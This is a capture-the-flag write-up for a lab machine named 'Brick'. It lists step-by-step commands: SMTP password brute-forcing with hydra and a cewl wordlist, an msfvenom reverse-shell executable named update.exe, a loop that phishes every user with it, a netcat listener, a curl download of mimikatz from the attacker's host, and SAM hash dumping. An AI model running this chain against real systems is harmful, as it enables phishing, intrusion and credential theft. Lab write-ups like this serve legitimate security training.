# CTF Writeup: Brick

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 25,110,135,139,143,445,587,3389,5985 are open
- Step 2: analyzed webpage "brownbrick.co" and found multiple mails/users under "Our Team"
- Step 3: made telnet <target_ip> 25, to check which options are available for SMTP
- Step 4: brute-forcing SMTP --> made a list of all email users "wlist.txt"
- Step 5: made hydra -l wlist.txt -P /usr/share/wordlists/rockyou.txt 10.10.219.65 smtp 
- Step 6: created another list for passwords --> made cewl <target_ip> --lowercase > custompasswords.txt
it scans the website and puts all the words into a wordlist
- Step 7: made hydra -L wlist.txt -P custompasswords.txt <target_ip> smtp -V -I --> gained lhedvig@brownbrick.co:bricks
- Step 8: generated windows rev shell using msfvenom --> made msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.156.104 LPORT=8888 -f exe -o update.exe
- Step 9: sent phishing mails to all the mails with following script:
for email in $(cat emails.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$email" -u "test" -m "test" -a update.exe -s 10.10.144.179:25 -xu "lhedvig@brownbrick.co" -xp "bricks"; done
- Step 10: started up listener --> made rlwrap nc -lvnp 8888 ran phishing mail script --> gained rce 
- Step 11: retrieved user flag in C:\\User\wrohit\Desktop\ 
- Step 12: uploaded mimikatz.exe (x64) into C:\\Temp --> started python server locally and made curl http://10.21.156.104:8080/mimikatz.exe -o mimikatz.exe
- Step 13: executed mimikatz.exe -> made mimikatz.exe --> made privilege::debug --> made token::elevate --> made lsadump::sam --> gained hash encrypted passwords 
- Step 14: decrypted passwords --> password for wrohit:superstar
- Step 15: retrieved admin password from C:\Program Files (x86)\hMailServer\Bin> 

---

## Key Learnings

- Added new tool "cewl" to arsenal --> filters all words of an webpage and puts them into an wordlist
- Learned a lot about Windows Servers Exploiting
- Immensly increased Phishing Methodology
- Slightly improved networking and os knowledge
- Immensly increased windows priv Esc
